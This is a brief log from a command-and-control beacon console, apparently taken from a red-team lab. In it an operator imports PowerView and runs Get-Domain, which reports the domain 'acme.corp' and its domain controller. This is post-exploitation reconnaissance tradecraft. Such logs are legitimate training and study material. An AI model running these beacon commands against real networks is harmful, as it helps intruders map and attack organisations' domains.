```powershell
[02/16 21:20:58] beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[02/16 21:21:01] [*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[02/16 21:21:01] [+] host called home, sent: 143784 bytes
[02/16 21:21:09] beacon> powerpick Get-Domain
[02/16 21:21:09] [+] host called home, sent: 10 bytes
[02/16 21:21:09] [*] Tasked beacon to run: Get-Domain (unmanaged)
[02/16 21:21:09] [+] host called home, sent: 138048 bytes
[02/16 21:21:12] [+] received output:


Forest                  : acme.corp
DomainControllers       : {dc.acme.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc.acme.corp
RidRoleOwner            : dc.acme.corp
InfrastructureRoleOwner : dc.acme.corp
Name                    : acme.corp

```